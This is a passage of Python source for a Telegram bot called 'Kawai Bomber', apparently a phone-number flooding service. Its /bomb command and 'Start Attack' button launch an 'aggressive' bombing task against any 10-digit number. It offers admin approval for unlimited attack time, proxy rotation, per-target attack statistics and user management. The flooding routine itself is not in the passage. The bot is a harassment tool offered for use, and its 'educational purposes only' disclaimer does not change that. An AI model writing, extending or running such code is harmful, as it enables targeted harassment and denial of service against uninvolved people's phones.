        [InlineKeyboardButton(f"{ANIME_STYLES['fire']} 𝐒𝐭𝐚𝐫𝐭 𝐀𝐭𝐭𝐚𝐜𝐤", callback_data='start_attack')],
        [InlineKeyboardButton(f"{ANIME_STYLES['info']} 𝐇𝐞𝐥𝐩", callback_data='help'),
         InlineKeyboardButton(f"{ANIME_STYLES['star']} 𝐒𝐭𝐚𝐭𝐮𝐬", callback_data='status')],
        [InlineKeyboardButton(f"{ANIME_STYLES['boom']} 𝐒𝐭𝐚𝐭𝐬", callback_data='stats')]
    ]
    
    if is_admin(user_id):
        keyboard.append([InlineKeyboardButton(f"{ANIME_STYLES['crown']} 𝐀𝐝𝐦𝐢𝐧 𝐏𝐚𝐧𝐞𝐥", callback_data='admin_panel')])
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        get_anime_banner(),
        reply_markup=reply_markup,
        parse_mode=ParseMode.MARKDOWN
    )

async def bomb_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /bomb command"""
    user_id = update.effective_user.id
    
    if is_banned(user_id):
        await update.message.reply_text(f"{ANIME_STYLES['skull']} 𝐘𝐨𝐮 𝐚𝐫𝐞 𝐛𝐚𝐧𝐧𝐞𝐝!")
        return
    
    if len(context.args) != 1:
        await update.message.reply_text(
            f"{ANIME_STYLES['error']} 𝐔𝐬𝐚𝐠𝐞: `/bomb <phone_number>`\n"
            f"𝔼𝕩𝕒𝕞𝕡𝕝𝕖: `/bomb 9876543210`",
            parse_mode=ParseMode.MARKDOWN
        )
        return
    
    phone = context.args[0]
    if not phone.isdigit() or len(phone) != 10:
        await update.message.reply_text(f"{ANIME_STYLES['error']} 𝕀𝕟𝕧𝕒𝕝𝕚𝕕 𝕡𝕙𝕠𝕟𝕖 𝕟𝕦𝕞𝕓𝕖𝕣! 𝕄𝕦𝕤𝕥 𝕓𝕖 𝟙𝟘 𝕕𝕚𝕘𝕚𝕥𝕤.")
        return
    
    if user_id in user_sessions:
        await update.message.reply_text(f"{ANIME_STYLES['warning']} 𝕐𝕠𝕦 𝕒𝕝𝕣𝕖𝕒𝕕𝕪 𝕙𝕒𝕧𝕖 𝕒𝕟 𝕒𝕔𝕥𝕚𝕧𝕖 𝕒𝕥𝕥𝕒𝕔𝕜! 𝕌𝕤𝕖 /𝕤𝕥𝕠𝕡 𝕗𝕚𝕣𝕤𝕥.")
        return
    
    # Start bombing attack
    task = asyncio.create_task(bombing_attack_aggressive(phone, user_id, update.effective_chat.id, context))
    user_sessions[user_id] = {
        "start_time": time.time(),
        "phone": phone,
        "task": task
    }
    global_stats["active_sessions"] += 1
    global_stats["total_bombs"] += 1

async def stop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /stop command"""
    user_id = update.effective_user.id
    
    if user_id in user_sessions:
        user_sessions[user_id]["task"].cancel()
        try:
            await user_sessions[user_id]["task"]
        except asyncio.CancelledError:
            pass
        del user_sessions[user_id]
        global_stats["active_sessions"] = max(0, global_stats["active_sessions"] - 1)
        await update.message.reply_text(f"{ANIME_STYLES['shield']} 𝔸𝕥𝕥𝕒𝕔𝕜 𝕤𝕥𝕠𝕡𝕡𝕖𝕕 𝕤𝕦𝕔𝕔𝕖𝕤𝕤𝕗𝕦𝕝𝕝𝕪!")
    else:
        await update.message.reply_text(f"{ANIME_STYLES['info']} ℕ𝕠 𝕒𝕔𝕥𝕚𝕧𝕖 𝕒𝕥𝕥𝕒𝕔𝕜 𝕥𝕠 𝕤𝕥𝕠𝕡.")

async def restart_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /restart command (admin only)"""
    user_id = update.effective_user.id
    
    if not is_admin(user_id):
        await update.message.reply_text(f"{ANIME_STYLES['error']} 𝔸𝕕𝕞𝕚𝕟 𝕠𝕟𝕝𝕪!")
        return
    
    await update.message.reply_text(f"{ANIME_STYLES['rocket']} ℝ𝕖𝕤𝕥𝕒𝕣𝕥𝕚𝕟𝕘 𝕓𝕠𝕥...")
    save_state()
    
    # Stop all active sessions
    for uid, session in list(user_sessions.items()):
        session["task"].cancel()
        del user_sessions[uid]
    
    global_stats["active_sessions"] = 0
    await update.message.reply_text(f"{ANIME_STYLES['success']} 𝔹𝕠𝕥 𝕣𝕖𝕤𝕥𝕒𝕣𝕥𝕖𝕕 𝕤𝕦𝕔𝕔𝕖𝕤𝕤𝕗𝕦𝕝𝕝𝕪!")

# ========== ADMIN COMMANDS ==========
async def addadmin_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /addadmin command"""
    user_id = update.effective_user.id
    
    if not is_admin(user_id):
        await update.message.reply_text(f"{ANIME_STYLES['error']} 𝔸𝕕𝕞𝕚𝕟 𝕠𝕟𝕝𝕪!")
        return
    
    if len(context.args) != 1:
        await update.message.reply_text(f"{ANIME_STYLES['error']} 𝐔𝐬𝐚𝐠𝐞: `/addadmin <user_id>`", parse_mode=ParseMode.MARKDOWN)
        return
    
    try:
        new_admin = int(context.args[0])
        admin_users.add(new_admin)
        approved_users.add(new_admin)  # Admins are auto-approved
        save_state()
        await update.message.reply_text(f"{ANIME_STYLES['crown']} 𝕌𝕤𝕖𝕣 `{new_admin}` 𝕒𝕕𝕕𝕖𝕕 𝕒𝕤 𝕒𝕕𝕞𝕚𝕟!", parse_mode=ParseMode.MARKDOWN)
    except:
        await update.message.reply_text(f"{ANIME_STYLES['error']} 𝕀𝕟𝕧𝕒𝕝𝕚𝕕 𝕦𝕤𝕖𝕣 𝕀𝔻!")

async def approve_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /approve command"""
    user_id = update.effective_user.id
    
    if not is_admin(user_id):
        await update.message.reply_text(f"{ANIME_STYLES['error']} 𝔸𝕕𝕞𝕚𝕟 𝕠𝕟𝕝𝕪!")
        return
    
    if len(context.args) != 1:
        await update.message.reply_text(f"{ANIME_STYLES['error']} 𝐔𝐬𝐚𝐠𝐞: `/approve <user_id>`", parse_mode=ParseMode.MARKDOWN)
        return
    
    try:
        user_to_approve = int(context.args[0])
        approved_users.add(user_to_approve)
        save_state()
        await update.message.reply_text(f"{ANIME_STYLES['success']} 𝕌𝕤𝕖𝕣 `{user_to_approve}` 𝕒𝕡𝕡𝕣𝕠𝕧𝕖𝕕!", parse_mode=ParseMode.MARKDOWN)
    except:
        await update.message.reply_text(f"{ANIME_STYLES['error']} 𝕀𝕟𝕧𝕒𝕝𝕚𝕕 𝕦𝕤𝕖𝕣 𝕀𝔻!")

async def removeuser_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /removeuser command"""
    user_id = update.effective_user.id
    
    if not is_admin(user_id):
        await update.message.reply_text(f"{ANIME_STYLES['error']} 𝔸𝕕𝕞𝕚𝕟 𝕠𝕟𝕝𝕪!")
        return
    
    if len(context.args) != 1:
        await update.message.reply_text(f"{ANIME_STYLES['error']} 𝐔𝐬𝐚𝐠𝐞: `/removeuser <user_id>`", parse_mode=ParseMode.MARKDOWN)
        return
    
    try:
        user_to_remove = int(context.args[0])
        approved_users.discard(user_to_remove)
        save_state()
        await update.message.reply_text(f"{ANIME_STYLES['success']} 𝕌𝕤𝕖𝕣 `{user_to_remove}` 𝕣𝕖𝕞𝕠𝕧𝕖𝕕 𝕗𝕣𝕠𝕞 𝕒𝕡𝕡𝕣𝕠𝕧𝕖𝕕 𝕝𝕚𝕤𝕥!", parse_mode=ParseMode.MARKDOWN)
    except:
        await update.message.reply_text(f"{ANIME_STYLES['error']} 𝕀𝕟𝕧𝕒𝕝𝕚𝕕 𝕦𝕤𝕖𝕣 𝕀𝔻!")

async def ban_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /ban command"""
    user_id = update.effective_user.id
    
    if not is_admin(user_id):
        await update.message.reply_text(f"{ANIME_STYLES['error']} 𝔸𝕕𝕞𝕚𝕟 𝕠𝕟𝕝𝕪!")
        return
    
    if len(context.args) != 1:
        await update.message.reply_text(f"{ANIME_STYLES['error']} 𝐔𝐬𝐚𝐠𝐞: `/ban <user_id>`", parse_mode=ParseMode.MARKDOWN)
        return
    
    try:
        user_to_ban = int(context.args[0])
        banned_users.add(user_to_ban)
        if user_to_ban in user_sessions:
            user_sessions[user_to_ban]["task"].cancel()
            del user_sessions[user_to_ban]
            global_stats["active_sessions"] = max(0, global_stats["active_sessions"] - 1)
        save_state()
        await update.message.reply_text(f"{ANIME_STYLES['skull']} 𝕌𝕤𝕖𝕣 `{user_to_ban}` 𝕓𝕒𝕟𝕟𝕖𝕕!", parse_mode=ParseMode.MARKDOWN)
    except:
        await update.message.reply_text(f"{ANIME_STYLES['error']} 𝕀𝕟𝕧𝕒𝕝𝕚𝕕 𝕦𝕤𝕖𝕣 𝕀𝔻!")

async def unban_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /unban command"""
    user_id = update.effective_user.id
    
    if not is_admin(user_id):
        await update.message.reply_text(f"{ANIME_STYLES['error']} 𝔸𝕕𝕞𝕚𝕟 𝕠𝕟𝕝𝕪!")
        return
    
    if len(context.args) != 1:
        await update.message.reply_text(f"{ANIME_STYLES['error']} 𝐔𝐬𝐚𝐠𝐞: `/unban <user_id>`", parse_mode=ParseMode.MARKDOWN)
        return
    
    try:
        user_to_unban = int(context.args[0])
        banned_users.discard(user_to_unban)
        save_state()
        await update.message.reply_text(f"{ANIME_STYLES['unlock']} 𝕌𝕤𝕖𝕣 `{user_to_unban}` 𝕦𝕟𝕓𝕒𝕟𝕟𝕖𝕕!", parse_mode=ParseMode.MARKDOWN)
    except:
        await update.message.reply_text(f"{ANIME_STYLES['error']} 𝕀𝕟𝕧𝕒𝕝𝕚𝕕 𝕦𝕤𝕖𝕣 𝕀𝔻!")

async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /status command"""
    user_id = update.effective_user.id
    
    if not is_admin(user_id):
        await update.message.reply_text(f"{ANIME_STYLES['error']} 𝔸𝕕𝕞𝕚𝕟 𝕠𝕟𝕝𝕪!")
        return
    
    total_req = global_stats["total_requests"]
    total_success = sum(us["success"] for us in user_stats.values())
    success_rate = (total_success / (total_req + 1)) * 100
    uptime = int(time.time() - global_stats["start_time"])
    
    status_text = f"""
{ANIME_STYLES['crown']} *𝐀𝐃𝐌𝐈𝐍 𝐒𝐓𝐀𝐓𝐔𝐒 𝐏𝐀𝐍𝐄𝐋* {ANIME_STYLES['crown']}

{ANIME_STYLES['star']} *𝔹𝕠𝕥 𝕊𝕥𝕒𝕥𝕤:*
  {ANIME_STYLES['rocket']} 𝕌𝕡𝕥𝕚𝕞𝕖: `{uptime}s`
  {ANIME_STYLES['bomb']} 𝕋𝕠𝕥𝕒𝕝 𝔹𝕠𝕞𝕓𝕤: `{global_stats['total_bombs']:,}`
  {ANIME_STYLES['fire']} 𝔸𝕔𝕥𝕚𝕧𝕖 𝕊𝕖𝕤𝕤𝕚𝕠𝕟𝕤: `{global_stats['active_sessions']}`
  {ANIME_STYLES['users']} 𝕋𝕠𝕥𝕒𝕝 𝕌𝕤𝕖𝕣𝕤: `{global_stats['total_users']:,}`
  {ANIME_STYLES['zap']} 𝕋𝕠𝕥𝕒𝕝 ℝ𝕖𝕢𝕦𝕖𝕤𝕥𝕤: `{total_req:,}`
  {ANIME_STYLES['success']} 𝕊𝕦𝕔𝕔𝕖𝕤𝕤 ℝ𝕒𝕥𝕖: `{success_rate:.2f}%`

{ANIME_STYLES['shield']} *𝕌𝕤𝕖𝕣 𝕊𝕥𝕒𝕥𝕤:*
  {ANIME_STYLES['crown']} 𝔸𝕕𝕞𝕚𝕟𝕤: `{len(admin_users)}`
  {ANIME_STYLES['unlock']} 𝔸𝕡𝕡𝕣𝕠𝕧𝕖𝕕 𝕌𝕤𝕖𝕣𝕤: `{len(approved_users)}`
  {ANIME_STYLES['lock']} 𝔹𝕒𝕟𝕟𝕖𝕕 𝕌𝕤𝕖𝕣𝕤: `{len(banned_users)}`

{ANIME_STYLES['fire']} *𝔸𝕔𝕥𝕚𝕧𝕖 𝔸𝕥𝕥𝕒𝕔𝕜𝕤:* (`{len(user_sessions)}`)
"""
    
    if user_sessions:
        for uid, session in user_sessions.items():
            elapsed = int(time.time() - session["start_time"])
            stats = user_stats[uid]
            user_rate = (stats['success'] / (stats['requests'] + 1)) * 100
            status_text += f"  • 𝕌𝕤𝕖𝕣 `{uid}`: `{session['phone']}` ({elapsed}s) | ℝ: {stats['requests']:,} | 𝕊: {stats['success']:,} | ℝ𝕒𝕥𝕖: {user_rate:.1f}%\n"
    else:
        status_text += "  • ℕ𝕠 𝕒𝕔𝕥𝕚𝕧𝕖 𝕒𝕥𝕥𝕒𝕔𝕜𝕤\n"
    
    await update.message.reply_text(status_text, parse_mode=ParseMode.MARKDOWN)

async def broadcast_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /broadcast command"""
    user_id = update.effective_user.id
    
    if not is_admin(user_id):
        await update.message.reply_text(f"{ANIME_STYLES['error']} 𝔸𝕕𝕞𝕚𝕟 𝕠𝕟𝕝𝕪!")
        return
    
    if not context.args:
        await update.message.reply_text(f"{ANIME_STYLES['error']} 𝐔𝐬𝐚𝐠𝐞: `/broadcast <message>`", parse_mode=ParseMode.MARKDOWN)
        return
    
    message = " ".join(context.args)
    success = 0
    failed = 0
    
    broadcast_msg = await update.message.reply_text(f"{ANIME_STYLES['rocket']} 𝔹𝕣𝕠𝕒𝕕𝕔𝕒𝕤𝕥𝕚𝕟𝕘 𝕥𝕠 {len(all_users):,} 𝕦𝕤𝕖𝕣𝕤...")
    
    for uid in all_users:
        try:
            await context.bot.send_message(
                chat_id=uid,
                text=f"{ANIME_STYLES['star']} *𝐀𝐍𝐍𝐎𝐔𝐍𝐂𝐄𝐌𝐄𝐍𝐓*\n\n{message}\n\n{ANIME_STYLES['star']} *𝔽𝕣𝕠𝕞: 𝕂𝕒𝕨𝕒𝕚 𝔹𝕠𝕞𝕓𝕖𝕣 𝔸𝕕𝕞𝕚𝕟*",
                parse_mode=ParseMode.MARKDOWN
            )
            success += 1
            await asyncio.sleep(0.05)  # Prevent rate limiting
        except Exception as e:
            failed += 1
    
    await broadcast_msg.edit_text(
        f"{ANIME_STYLES['success']} *𝐁𝐫𝐨𝐚𝐝𝐜𝐚𝐬𝐭 𝐂𝐨𝐦𝐩𝐥𝐞𝐭𝐞!*\n\n"
        f"{ANIME_STYLES['success']} 𝕊𝕦𝕔𝕔𝕖𝕤𝕤: `{success:,}`\n"
        f"{ANIME_STYLES['error']} 𝔽𝕒𝕚𝕝𝕖𝕕: `{failed:,}`\n"
        f"{ANIME_STYLES['star']} 𝕋𝕠𝕥𝕒𝕝: `{len(all_users):,}`",
        parse_mode=ParseMode.MARKDOWN
    )

async def users_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /users command - list all users"""
    user_id = update.effective_user.id
    
    if not is_admin(user_id):
        await update.message.reply_text(f"{ANIME_STYLES['error']} 𝔸𝕕𝕞𝕚𝕟 𝕠𝕟𝕝𝕪!")
        return
    
    if not all_users:
        await update.message.reply_text(f"{ANIME_STYLES['info']} ℕ𝕠 𝕦𝕤𝕖𝕣𝕤 𝕪𝕖𝕥.")
        return
    
    # Split into chunks for Telegram's message limit
    user_list = list(all_users)
    chunks = [user_list[i:i + 50] for i in range(0, len(user_list), 50)]
    
    for i, chunk in enumerate(chunks):
        user_text = f"{ANIME_STYLES['star']} *𝕌𝕤𝕖𝕣𝕤 𝕃𝕚𝕤𝕥 ({i+1}/{len(chunks)})*\n\n"
        for uid in chunk:
            user_text += f"• `{uid}`"
            if uid in admin_users:
                user_text += f" {ANIME_STYLES['crown']}"
            if uid in approved_users:
                user_text += f" {ANIME_STYLES['unlock']}"
            if uid in banned_users:
                user_text += f" {ANIME_STYLES['lock']}"
            user_text += "\n"
        
        await update.message.reply_text(user_text, parse_mode=ParseMode.MARKDOWN)
        await asyncio.sleep(0.5)

# ========== CALLBACK HANDLERS ==========
async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle button callbacks"""
    query = update.callback_query
    await query.answer()
    
    user_id = update.effective_user.id
    
    if query.data == 'start_attack':
        await query.edit_message_text(
            f"{ANIME_STYLES['fire']} *𝐒𝐓𝐀𝐑𝐓 𝐀𝐓𝐓𝐀𝐂𝐊* {ANIME_STYLES['fire']}\n\n"
            "𝕊𝕖𝕟𝕕 𝕞𝕖 𝕥𝕙𝕖 𝕡𝕙𝕠𝕟𝕖 𝕟𝕦𝕞𝕓𝕖𝕣:\n"
            "𝔽𝕠𝕣𝕞𝕒𝕥: `9876543210`\n\n"
            "𝕆𝕣 𝕦𝕤𝕖 𝕔𝕠𝕞𝕞𝕒𝕟𝕕: `/bomb 9876543210`",
            parse_mode=ParseMode.MARKDOWN
        )
    
    elif query.data == 'help':
        await query.edit_message_text(
            f"{ANIME_STYLES['info']} *𝐇𝐄𝐋𝐏 𝐆𝐔𝐈𝐃𝐄* {ANIME_STYLES['info']}\n\n"
            "• 𝕌𝕤𝕖 `/bomb <number>` 𝕥𝕠 𝕤𝕥𝕒𝕣𝕥 𝕒𝕥𝕥𝕒𝕔𝕜\n"
            "• 𝕌𝕤𝕖 `/stop` 𝕥𝕠 𝕤𝕥𝕠𝕡 𝕔𝕦𝕣𝕣𝕖𝕟𝕥 𝕒𝕥𝕥𝕒𝕔𝕜\n"
            "• 𝔸𝕦𝕥𝕠-𝕤𝕥𝕠𝕡 𝕒𝕗𝕥𝕖𝕣 𝟙 𝕙𝕠𝕦𝕣 𝕗𝕠𝕣 𝕟𝕠𝕣𝕞𝕒𝕝 𝕦𝕤𝕖𝕣𝕤\n"
            "• 𝕌𝕟𝕝𝕚𝕞𝕚𝕥𝕖𝕕 𝕥𝕚𝕞𝕖 𝕗𝕠𝕣 𝕒𝕡𝕡𝕣𝕠𝕧𝕖𝕕 𝕦𝕤𝕖𝕣𝕤\n"
            "• 𝔸𝕘𝕘𝕣𝕖𝕤𝕤𝕚𝕧𝕖 𝕡𝕣𝕠𝕩𝕪 𝕣𝕠𝕥𝕒𝕥𝕚𝕠𝕟\n\n"
            f"{ANIME_STYLES['warning']} *𝐃𝐈𝐒𝐂𝐋𝐀𝐈𝐌𝐄𝐑*\n"
            "𝔽𝕠𝕣 𝕖𝕕𝕦𝕔𝕒𝕥𝕚𝕠𝕟𝕒𝕝 𝕡𝕦𝕣𝕡𝕠𝕤𝕖𝕤 𝕠𝕟𝕝𝕪!\n\n"
            f"{ANIME_STYLES['star']} *𝐂𝐫𝐞𝐝𝐢𝐭𝐬*\n"
            "𝕄𝕒𝕕𝕖 𝕓𝕪: @𝕫𝕖𝕣𝕠𝕔𝕪𝕡𝕙\n"
            "ℙ𝕠𝕨𝕖𝕣𝕖𝕕 𝕓𝕪: @𝕫𝕖𝕣𝕠𝕔𝕪𝕡𝕙",
            parse_mode=ParseMode.MARKDOWN
        )
    
    elif query.data == 'status':
        if user_id in user_sessions:
            session = user_sessions[user_id]
            elapsed = int(time.time() - session["start_time"])
            stats = user_stats[user_id]
            success_rate = (stats['success'] / stats['requests'] * 100) if stats['requests'] > 0 else 0
            
            await query.edit_message_text(
                f"{ANIME_STYLES['fire']} *𝐘𝐎𝐔𝐑 𝐒𝐓𝐀𝐓𝐔𝐒* {ANIME_STYLES['fire']}\n\n"
                f"{ANIME_STYLES['phone']} 𝕋𝕒𝕣𝕘𝕖𝕥: `{session['phone']}`\n"
                f"{ANIME_STYLES['clock']} 𝔼𝕝𝕒𝕡𝕤𝕖𝕕: `{elapsed}s`\n"
                f"{ANIME_STYLES['bomb']} ℝ𝕖𝕢𝕦𝕖𝕤𝕥𝕤: `{stats['requests']:,}`\n"
                f"{ANIME_STYLES['success']} 𝕊𝕦𝕔𝕔𝕖𝕤𝕤: `{stats['success']:,}`\n"
                f"{ANIME_STYLES['error']} 𝔽𝕒𝕚𝕝𝕖𝕕: `{stats['failed']:,}`\n"
                f"{ANIME_STYLES['star']} ℝ𝕒𝕥𝕖: `{success_rate:.1f}%`\n"
                f"{ANIME_STYLES['shield']} 𝔸𝕡𝕡𝕣𝕠𝕧𝕖𝕕: `{'✅ 𝕐𝕖𝕤' if is_approved(user_id) else '❌ ℕ𝕠'}`\n"
                f"{ANIME_STYLES['crown']} 𝔸𝕕𝕞𝕚𝕟: `{'✅ 𝕐𝕖𝕤' if is_admin(user_id) else '❌ ℕ𝕠'}`",
                parse_mode=ParseMode.MARKDOWN
            )
        else:
            await query.edit_message_text(
                f"{ANIME_STYLES['info']} *𝐘𝐎𝐔𝐑 𝐒𝐓𝐀𝐓𝐔𝐒*\n\n"
                f"{ANIME_STYLES['fire']} 𝔸𝕔𝕥𝕚𝕧𝕖 𝔸𝕥𝕥𝕒𝕔𝕜: `{'✅ 𝕐𝕖𝕤' if user_id in user_sessions else '❌ ℕ𝕠'}`\n"
                f"{ANIME_STYLES['unlock']} 𝔸𝕡𝕡𝕣𝕠𝕧𝕖𝕕 𝕌𝕤𝕖𝕣: `{'✅ 𝕐𝕖𝕤' if is_approved(user_id) else '❌ ℕ𝕠'}`\n"
                f"{ANIME_STYLES['crown']} 𝔸𝕕𝕞𝕚𝕟: `{'✅ 𝕐𝕖𝕤' if is_admin(user_id) else '❌ ℕ𝕠'}`\n"
                f"{ANIME_STYLES['lock']} 𝔹𝕒𝕟𝕟𝕖𝕕: `{'✅ 𝕐𝕖𝕤' if is_banned(user_id) else '❌ ℕ𝕠'}`\n\n"
                f"{ANIME_STYLES['star']} 𝕋𝕠𝕥𝕒𝕝 ℝ𝕖𝕢𝕦𝕖𝕤𝕥𝕤: `{user_stats[user_id]['requests']:,}`",
                parse_mode=ParseMode.MARKDOWN
            )
    
    elif query.data == 'stats':
        total_req = global_stats["total_requests"]
        total_success = sum(us["success"] for us in user_stats.values())
        success_rate = (total_success / (total_req + 1)) * 100
        uptime = int(time.time() - global_stats["start_time"])
        
        await query.edit_message_text(
            f"{ANIME_STYLES['star']} *𝐆𝐋𝐎𝐁𝐀𝐋 𝐒𝐓𝐀𝐓𝐒* {ANIME_STYLES['star']}\n\n"
            f"{ANIME_STYLES['rocket']} 𝕌𝕡𝕥𝕚𝕞𝕖: `{uptime}s`\n"
            f"{ANIME_STYLES['bomb']} 𝕋𝕠𝕥𝕒𝕝 𝔹𝕠𝕞𝕓𝕤: `{global_stats['total_bombs']:,}`\n"
            f"{ANIME_STYLES['fire']} 𝔸𝕔𝕥𝕚𝕧𝕖 𝕊𝕖𝕤𝕤𝕚𝕠𝕟𝕤: `{global_stats['active_sessions']}`\n"
            f"{ANIME_STYLES['users']} 𝕋𝕠𝕥𝕒𝕝 𝕌𝕤𝕖𝕣𝕤: `{global_stats['total_users']:,}`\n"
            f"{ANIME_STYLES['zap']} 𝕋𝕠𝕥𝕒𝕝 ℝ𝕖𝕢𝕦𝕖𝕤𝕥𝕤: `{total_req:,}`\n"
            f"{ANIME_STYLES['success']} 𝕊𝕦𝕔𝕔𝕖𝕤𝕤 ℝ𝕒𝕥𝕖: `{success_rate:.1f}%`\n\n"
            f"{ANIME_STYLES['heart']} *𝕂𝕒𝕨𝕒𝕚 𝔹𝕠𝕞𝕓𝕖𝕣 - ℙ𝕠𝕨𝕖𝕣𝕖𝕕 𝕓𝕪 @𝕫𝕖𝕣𝕠𝕔𝕪𝕡𝕙*",
            parse_mode=ParseMode.MARKDOWN
        )
    
    elif query.data == 'admin_panel':
        if not is_admin(user_id):
            await query.edit_message_text(f"{ANIME_STYLES['error']} 𝔸𝕕𝕞𝕚𝕟 𝕠𝕟𝕝𝕪!")
            return
        
        keyboard = [
            [InlineKeyboardButton(f"{ANIME_STYLES['crown']} 𝔸𝕕𝕕 𝔸𝕕𝕞𝕚𝕟", callback_data='admin_add'),
             InlineKeyboardButton(f"{ANIME_STYLES['success']} 𝔸𝕡𝕡𝕣𝕠𝕧𝕖", callback_data='admin_approve')],
            [InlineKeyboardButton(f"{ANIME_STYLES['error']} ℝ𝕖𝕞𝕠𝕧𝕖", callback_data='admin_remove'),
             InlineKeyboardButton(f"{ANIME_STYLES['skull']} 𝔹𝕒𝕟", callback_data='admin_ban')],
            [InlineKeyboardButton(f"{ANIME_STYLES['unlock']} 𝕌𝕟𝕓𝕒𝕟", callback_data='admin_unban'),
             InlineKeyboardButton(f"{ANIME_STYLES['star']} 𝕊𝕥𝕒𝕥𝕤", callback_data='admin_stats')],
            [InlineKeyboardButton(f"{ANIME_STYLES['rocket']} 𝔹𝕣𝕠𝕒𝕕𝕔𝕒𝕤𝕥", callback_data='admin_broadcast'),
             InlineKeyboardButton(f"{ANIME_STYLES['users']} 𝕌𝕤𝕖𝕣𝕤", callback_data='admin_users')],
            [InlineKeyboardButton(f"{ANIME_STYLES['zap']} ℝ𝕖𝕤𝕥𝕒𝕣𝕥", callback_data='admin_restart')],
            [InlineKeyboardButton(f"{ANIME_STYLES['back']} 𝔹𝕒𝕔𝕜", callback_data='back_main')]
        ]
        
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.edit_message_text(
            f"{ANIME_STYLES['crown']} *𝐀𝐃𝐌𝐈𝐍 𝐏𝐀𝐍𝐄𝐋* {ANIME_STYLES['crown']}\n\n"
            f"{ANIME_STYLES['users']} 𝕋𝕠𝕥𝕒𝕝 𝕌𝕤𝕖𝕣𝕤: `{len(all_users):,}`\n"
            f"{ANIME_STYLES['fire']} 𝔸𝕔𝕥𝕚𝕧𝕖 𝕊𝕖𝕤𝕤𝕚𝕠𝕟𝕤: `{len(user_sessions)}`\n"
            f"{ANIME_STYLES['unlock']} 𝔸𝕡𝕡𝕣𝕠𝕧𝕖𝕕 𝕌𝕤𝕖𝕣𝕤: `{len(approved_users)}`\n"
            f"{ANIME_STYLES['lock']} 𝔹𝕒𝕟𝕟𝕖𝕕 𝕌𝕤𝕖𝕣𝕤: `{len(banned_users)}`\n\n"
            "𝕊𝕖𝕝𝕖𝕔𝕥 𝕒𝕟 𝕠𝕡𝕥𝕚𝕠𝕟:",
            reply_markup=reply_markup,
            parse_mode=ParseMode.MARKDOWN
        )
    
    elif query.data == 'admin_add':
        await query.edit_message_text(
            f"{ANIME_STYLES['crown']} *𝐀𝐃𝐃 𝐀𝐃𝐌𝐈𝐍*\n\n"
            "𝐔𝐬𝐚𝐠𝐞: `/addadmin <user_id>`\n\n"
            "𝔼𝕩𝕒𝕞𝕡𝕝𝕖: `/addadmin 1234567890`",
            parse_mode=ParseMode.MARKDOWN
        )
    
    elif query.data == 'admin_approve':
        await query.edit_message_text(
            f"{ANIME_STYLES['success']} *𝐀𝐏𝐏𝐑𝐎𝐕𝐄 𝐔𝐒𝐄𝐑*\n\n"
            "𝐔𝐬𝐚𝐠𝐞: `/approve <user_id>`\n\n"
            "𝔼𝕩𝕒𝕞𝕡𝕝𝕖: `/approve 1234567890`",
            parse_mode=ParseMode.MARKDOWN
        )
    
    elif query.data == 'admin_remove':
        await query.edit_message_text(
            f"{ANIME_STYLES['error']} *𝐑𝐄𝐌𝐎𝐕𝐄 𝐔𝐒𝐄𝐑*\n\n"
            "𝐔𝐬𝐚𝐠𝐞: `/removeuser <user_id>`\n\n"
            "𝔼𝕩𝕒𝕞𝕡𝕝𝕖: `/removeuser 1234567890`",
            parse_mode=ParseMode.MARKDOWN
        )
    
    elif query.data == 'admin_ban':
        await query.edit_message_text(
            f"{ANIME_STYLES['skull']} *𝐁𝐀𝐍 𝐔𝐒𝐄𝐑*\n\n"
            "𝐔𝐬𝐚𝐠𝐞: `/ban <user_id>`\n\n"
            "𝔼𝕩𝕒𝕞𝕡𝕝𝕖: `/ban 1234567890`",
            parse_mode=ParseMode.MARKDOWN
        )
    
    elif query.data == 'admin_unban':
        await query.edit_message_text(
            f"{ANIME_STYLES['unlock']} *𝐔𝐍𝐁𝐀𝐍 𝐔𝐒𝐄𝐑*\n\n"
            "𝐔𝐬𝐚𝐠𝐞: `/unban <user_id>`\n\n"
            "𝔼𝕩𝕒𝕞𝕡𝕝𝕖: `/unban 1234567890`",
            parse_mode=ParseMode.MARKDOWN
        )
    
    elif query.data == 'admin_stats':
        await status_command(update, context)
        return
    
    elif query.data == 'admin_broadcast':
        await query.edit_message_text(
            f"{ANIME_STYLES['rocket']} *𝐁𝐑𝐎𝐀𝐃𝐂𝐀𝐒𝐓 𝐌𝐄𝐒𝐒𝐀𝐆𝐄*\n\n"
            "𝐔𝐬𝐚𝐠𝐞: `/broadcast <your message>`\n\n"
            "𝔼𝕩𝕒𝕞𝕡𝕝𝕖: `/broadcast 𝕊𝕖𝕣𝕧𝕖𝕣 𝕞𝕒𝕚𝕟𝕥𝕖𝕟𝕒𝕟𝕔𝕖 𝕚𝕟 𝟙𝟘 𝕞𝕚𝕟𝕦𝕥𝕖𝕤`",
            parse_mode=ParseMode.MARKDOWN
        )
    
    elif query.data == 'admin_users':
        await users_command(update, context)
        return
    
    elif query.data == 'admin_restart':
        await restart_command(update, context)
        return
    
    elif query.data == 'back_main':
        keyboard = [
            [InlineKeyboardButton(f"{ANIME_STYLES['fire']} 𝐒𝐭𝐚𝐫𝐭 𝐀𝐭𝐭𝐚𝐜𝐤", callback_data='start_attack')],
            [InlineKeyboardButton(f"{ANIME_STYLES['info']} 𝐇𝐞𝐥𝐩", callback_data='help'),
             InlineKeyboardButton(f"{ANIME_STYLES['star']} 𝐒𝐭𝐚𝐭𝐮𝐬", callback_data='status')],
            [InlineKeyboardButton(f"{ANIME_STYLES['boom']} 𝐒𝐭𝐚𝐭𝐬", callback_data='stats')]
        ]
        
        if is_admin(user_id):
            keyboard.append([InlineKeyboardButton(f"{ANIME_STYLES['crown']} 𝐀𝐝𝐦𝐢𝐧 𝐏𝐚𝐧𝐞𝐥", callback_data='admin_panel')])
        
